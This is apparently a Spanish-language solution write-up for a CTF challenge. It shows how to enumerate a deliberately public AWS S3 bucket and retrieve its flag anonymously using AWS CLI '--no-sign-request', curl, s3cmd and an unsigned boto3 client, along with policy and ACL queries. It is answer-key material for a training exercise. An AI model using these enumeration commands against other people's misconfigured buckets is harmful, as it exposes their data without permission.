# Challenge 01 - AWS Public Storage Solution

## Solución del Desafío

### Paso a Paso para Candidatos

Una vez que tengas los outputs del despliegue de Terraform, sigue estos pasos para enumerar el bucket S3 y obtener la flag:

#### Información Disponible
Con base en los outputs de Terraform, tienes:
```
aws_flag_url = "http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt"
aws_s3_bucket_name = "ctf-25-website-c7b06639"
aws_s3_website_endpoint = "http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com"
```

#### Método 1: Enumeración con AWS CLI (Recomendado)

**Paso 1: Listar objetos del bucket**
```bash
# Listar todos los objetos en el bucket público
aws s3 ls s3://ctf-25-website-c7b06639 --no-sign-request

# Salida esperada:
# 2024-01-15 10:30:45        123 flag.txt
# 2024-01-15 10:30:45       1024 index.html
```

**Paso 2: Descargar y ver el contenido de la flag**
```bash
# Descargar la flag directamente a stdout
aws s3 cp s3://ctf-25-website-c7b06639/flag.txt - --no-sign-request

# O descargar a un archivo local
aws s3 cp s3://ctf-25-website-c7b06639/flag.txt ./flag.txt --no-sign-request
cat flag.txt
```

**Paso 3: Verificar otros archivos (opcional)**
```bash
# Ver el contenido del index.html
aws s3 cp s3://ctf-25-website-c7b06639/index.html - --no-sign-request
```

#### Método 2: Acceso Web Directo

**Paso 1: Acceder al sitio web**
```bash
# Usar curl para acceder al endpoint web
curl http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com

# O abrir en navegador
open http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com
```

**Paso 2: Acceder directamente a la flag**
```bash
# Descargar la flag vía HTTP
curl http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt

# O usar wget
wget -O - http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt
```

#### Método 3: Enumeración con herramientas de terceros

**Usando s3cmd:**
```bash
# Instalar s3cmd si no está disponible
pip install s3cmd

# Listar objetos (configuración anónima)
s3cmd ls s3://ctf-25-website-c7b06639 --no-ssl

# Descargar flag
s3cmd get s3://ctf-25-website-c7b06639/flag.txt --no-ssl
```

**Usando boto3 (Python):**
```python
import boto3
from botocore import UNSIGNED
from botocore.config import Config

# Cliente S3 sin autenticación
s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))

# Listar objetos
response = s3.list_objects_v2(Bucket='ctf-25-website-c7b06639')
for obj in response.get('Contents', []):
    print(f"{obj['Key']} - {obj['Size']} bytes")

# Descargar flag
response = s3.get_object(Bucket='ctf-25-website-c7b06639', Key='flag.txt')
flag_content = response['Body'].read().decode('utf-8')
print(f"Flag: {flag_content}")
```

#### Método 4: Enumeración Manual con Browser

1. **Acceder al bucket via navegador:**
   - URL: `http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com`
   - Explorar el contenido disponible

2. **Acceso directo a la flag:**
   - URL: `http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt`

### Comandos de Verificación

**Verificar permisos del bucket:**
```bash
# Intentar obtener la política del bucket
aws s3api get-bucket-policy --bucket ctf-25-website-c7b06639 --no-sign-request

# Verificar configuración de sitio web
aws s3api get-bucket-website --bucket ctf-25-website-c7b06639 --no-sign-request

# Verificar ACL del bucket
aws s3api get-bucket-acl --bucket ctf-25-website-c7b06639 --no-sign-request
```

### Formato de la Flag
```
CLD[UUID]
```

### Puntos de Aprendizaje

1. **Buckets S3 públicos**: Los buckets con políticas de acceso público permiten enumeración sin autenticación
2. **Website hosting**: Los buckets configurados como sitios web estáticos son accesibles vía HTTP
3. **Enumeración**: Múltiples métodos para acceder al contenido (AWS CLI, curl, navegador, herramientas de terceros)
4. **Sin autenticación**: El flag `--no-sign-request` permite acceso anónimo a recursos públicos

## Troubleshooting de Enumeración

### Problemas Comunes

**Error: "NoSuchBucket" al enumerar**
```bash
# Verificar que el bucket existe
aws s3api head-bucket --bucket ctf-25-website-c7b06639 --no-sign-request

# Si falla, verificar el nombre exacto del bucket en los outputs de Terraform
terraform output aws_s3_bucket_name
```

**Error: "Access Denied" durante enumeración**
```bash
# Verificar si el bucket permite acceso público
aws s3api get-bucket-policy --bucket ctf-25-website-c7b06639 --no-sign-request

# Intentar acceso web directo si AWS CLI falla
curl -I http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com
```

**Error: "SSL Certificate" con herramientas de terceros**
```bash
# Para s3cmd, usar --no-ssl
s3cmd ls s3://ctf-25-website-c7b06639 --no-ssl

# Para curl, usar --insecure si es necesario
curl --insecure http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt
```

**Timeout o conexión lenta**
```bash
# Verificar conectividad básica
ping s3.amazonaws.com

# Usar región específica si hay problemas
aws s3 ls s3://ctf-25-website-c7b06639 --region us-east-1 --no-sign-request
```

**Flag no encontrada**
```bash
# Listar todos los objetos para verificar estructura
aws s3 ls s3://ctf-25-website-c7b06639 --recursive --no-sign-request

# Verificar si la flag está en subdirectorios
aws s3 ls s3://ctf-25-website-c7b06639/ --recursive --no-sign-request | grep -i flag
```
